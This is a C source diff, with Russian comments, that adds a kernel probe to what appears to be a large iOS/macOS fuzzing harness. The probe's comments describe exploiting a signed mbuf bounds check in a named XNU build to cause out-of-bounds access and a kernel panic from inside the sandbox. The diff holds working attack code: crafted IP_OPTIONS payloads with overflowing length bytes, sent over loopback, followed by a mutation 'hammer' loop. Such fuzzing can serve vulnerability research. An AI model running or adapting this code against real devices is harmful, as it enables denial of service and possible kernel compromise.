@@ -43865,6 +43865,173 @@ static void p_bq85(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq86 — v245: MBUF SIGNEDNESS через IP_OPTIONS (§236).
+// XNU 27.0 (24A435): mbuf bounds check `len (%d) < off+len (%d+%d)` —
+// SIGNED. 27.2 (24B115): `(%u)` — UNSIGNED. Отрицательный off/len
+// bypass проверку в 27.0 → OOB в network stack.
+// IP_OPTIONS достижимы из песочницы (§165: парсер принимает LSRR).
+// Атака: крафтим опции с экстремальными длинами → off+len overflow →
+// signed check пропускает → mbuf OOB → kernel panic.
+static void p_bq86(void) {
+    LOG("[bq86] v245: mbuf signedness через IP_OPTIONS (§236)");
+    fsync(fileno(stderr));
+    int ncycles = getenv("FUZZ_BQ86_N") ? atoi(getenv("FUZZ_BQ86_N")) : 100;
+
+    // Контроль §144: легальные IP_OPTIONS + send — не должно падать
+    {
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        if (s < 0) { LOG("[bq86] socket FAILED errno %d", errno); return; }
+        uint8_t nop[4] = {1, 1, 1, 0};   // 3 NOP + EOL
+        int rc = setsockopt(s, IPPROTO_IP, IP_OPTIONS, nop, 4);
+        struct sockaddr_in a = {0};
+        a.sin_len = sizeof(a); a.sin_family = AF_INET;
+        a.sin_port = htons(9); a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        ssize_t sent = sendto(s, "ctl", 3, 0, (struct sockaddr *)&a, sizeof(a));
+        LOG("[bq86] CONTROL (NOP options): setsockopt=%d sendto=%zd %s",
+            rc, sent, sent >= 0 ? "OK — не должно падать" : "refused");
+        close(s);
+        fsync(fileno(stderr));
+    }
+
+    // === УДАР: signed mbuf bounds bypass ===
+    // Стратегия: option с length byte близким к overflow → off+len wraps
+    // negative → signed check `len < off+len` == false → OOB access.
+    struct {
+        const char *what;
+        uint8_t b[40];
+        int n;
+        int send_after;
+    } cases[] = {
+        // LSRR с len=0xFF (255) — опция заявляет 255 байтов, буфер 40
+        // Parser: off += 255; если off int32 и близко к границе → overflow
+        {"LSRR len=0xFF", {0x83, 0xFF, 0x04, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0}, 40, 1},
+        // SSRR с len=0xFF — source route с полной длиной
+        {"SSRR len=0xFF", {0x89, 0xFF, 0x04, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0,
+                           0, 0, 0, 0, 0, 0, 0, 0}, 40, 1},
+        // Timestamp с len=0xFF и overflow flag
+        {"TS len=0xFF oflow", {0x44, 0xFF, 0x01, 0x00, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0}, 40, 1},
+        // Record Route с len=0xFF
+        {"RR len=0xFF", {0x07, 0xFF, 0x04, 0, 0, 0, 0, 0,
+                         0, 0, 0, 0, 0, 0, 0, 0,
+                         0, 0, 0, 0, 0, 0, 0, 0,
+                         0, 0, 0, 0, 0, 0, 0, 0,
+                         0, 0, 0, 0, 0, 0, 0, 0}, 40, 1},
+        // Security с len=0 (бесконечный loop кандидат)
+        {"SEC len=0", {0x82, 0x00, 0, 0, 0, 0, 0, 0,
+                       0, 0, 0, 0, 0, 0, 0, 0,
+                       0, 0, 0, 0, 0, 0, 0, 0,
+                       0, 0, 0, 0, 0, 0, 0, 0,
+                       0, 0, 0, 0, 0, 0, 0, 0}, 8, 1},
+        // NOP flood: 40 NOPs (0x01) — парсер должен пройти все
+        {"40x NOP", {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
+                     1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
+                     1, 1, 1, 1, 1, 1, 1, 0}, 40, 1},
+        // Stream ID с len=0xFFFF (stream ident, type 0x88)
+        {"STREAMID len=0xFF", {0x88, 0xFF, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0,
+                               0, 0, 0, 0, 0, 0, 0, 0}, 40, 1},
+        // Multiple overflow options: LSRR(255) + RR(255) + TS(255)
+        {"LSRR+RR+TS overflow", {0x83, 0xFF, 0x04, 0, 0, 0, 0, 0,
+                                 0x07, 0xFF, 0x04, 0, 0, 0, 0, 0,
+                                 0x44, 0xFF, 0x01, 0, 0, 0, 0, 0,
+                                 0, 0, 0, 0, 0, 0, 0, 0,
+                                 0, 0, 0, 0, 0, 0, 0, 0}, 40, 1},
+    };
+    int ncases = sizeof(cases) / sizeof(cases[0]);
+
+    for (int ci = 0; ci < ncases; ci++) {
+        LOG("[bq86] case %d/%d: %s", ci + 1, ncases, cases[ci].what);
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        if (s < 0) { LOG("[bq86]   socket errno %d", errno); continue; }
+        int rc = setsockopt(s, IPPROTO_IP, IP_OPTIONS,
+                           cases[ci].b, cases[ci].n);
+        LOG("[bq86]   setsockopt(%d bytes) -> %d errno %d %s",
+            cases[ci].n, rc, rc < 0 ? errno : 0,
+            rc == 0 ? "*** ПРИНЯТО ***" : "(refused)");
+        if (rc == 0 && cases[ci].send_after) {
+            struct sockaddr_in a = {0};
+            a.sin_len = sizeof(a); a.sin_family = AF_INET;
+            a.sin_port = htons(9);
+            a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+            ssize_t sent = sendto(s, "x", 1, 0,
+                                  (struct sockaddr *)&a, sizeof(a));
+            LOG("[bq86]   sendto -> %zd errno %d", sent,
+                sent < 0 ? errno : 0);
+        }
+        // Читаем обратно — что ядро сохранило
+        if (rc == 0) {
+            uint8_t back[44] = {0};
+            socklen_t bl = sizeof(back);
+            int grc = getsockopt(s, IPPROTO_IP, IP_OPTIONS, back, &bl);
+            if (grc == 0) {
+                LOG("[bq86]   getsockopt -> len %u", bl);
+                char hex[90] = "";
+                for (int j = 0; j < (int)bl && j < 40; j++)
+                    snprintf(hex + j*2, 3, "%02x", back[j]);
+                LOG("[bq86]   kernel-stored: %s", hex);
+            }
+        }
+        close(s);
+        fsync(fileno(stderr));
+        usleep(50000);
+    }
+
+    // === Хаммер: быстрый цикл setsockopt+sendto с overflow-опциями ===
+    LOG("[bq86] ХАММЕР: %d циклов setsockopt+send", ncycles);
+    for (int cy = 0; cy < ncycles; cy++) {
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        if (s < 0) break;
+        // Мутируем length byte каждой итерацией (sweep по boundary)
+        uint8_t opts[40] = {0};
+        int variant = cy % 4;
+        switch (variant) {
+        case 0:  // LSRR с len=boundary
+            opts[0] = 0x83; opts[1] = (uint8_t)(0xF0 + (cy & 0x0F));
+            opts[2] = 0x04;
+            break;
+        case 1:  // SSRR с len=boundary
+            opts[0] = 0x89; opts[1] = (uint8_t)(0xF0 + (cy & 0x0F));
+            opts[2] = 0x04;
+            break;
+        case 2:  // TS с len=boundary + oflow
+            opts[0] = 0x44; opts[1] = (uint8_t)(0xF0 + (cy & 0x0F));
+            opts[2] = 0x01; opts[3] = (uint8_t)(cy & 0xFF);
+            break;
+        case 3:  // RR с len=boundary
+            opts[0] = 0x07; opts[1] = (uint8_t)(0xF0 + (cy & 0x0F));
+            opts[2] = 0x04;
+            break;
+        }
+        // Дополняем до 40 байт
+        for (int j = 3; j < 40; j++) opts[j] = (uint8_t)(cy + j);
+        setsockopt(s, IPPROTO_IP, IP_OPTIONS, opts, 40);
+        struct sockaddr_in a = {0};
+        a.sin_len = sizeof(a); a.sin_family = AF_INET;
+        a.sin_port = htons(9);
+        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        sendto(s, "y", 1, 0, (struct sockaddr *)&a, sizeof(a));
+        close(s);
+        if ((cy % 20) == 0)
+            LOG("[bq86] h%d/%d variant=%d len_byte=0x%02x",
+                cy, ncycles, variant, opts[1]);
+    }
+    LOG("[bq86] ИТОГ: хаммер завершён (устройство живо? = нет паники)");
+    fsync(fileno(stderr));
+}
+
 // p_bq84 — v240: ПРЯМОЙ IOKit-клиент AppleAVE2Driver. Протокол §233
 // (декомпиляты ave.videoencoder + ave2-кекст): обходим userspace-гейт FIG
 // и говорим с кекстом теми же командами, что и настоящий кодек —
@@ -52184,6 +52351,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ83")) { p_bq83(); LOG("[probe13] bq83-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ84")) { p_bq84(); LOG("[probe13] bq84-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ85")) { p_bq85(); LOG("[probe13] bq85-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ86")) { p_bq86(); LOG("[probe13] bq86-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
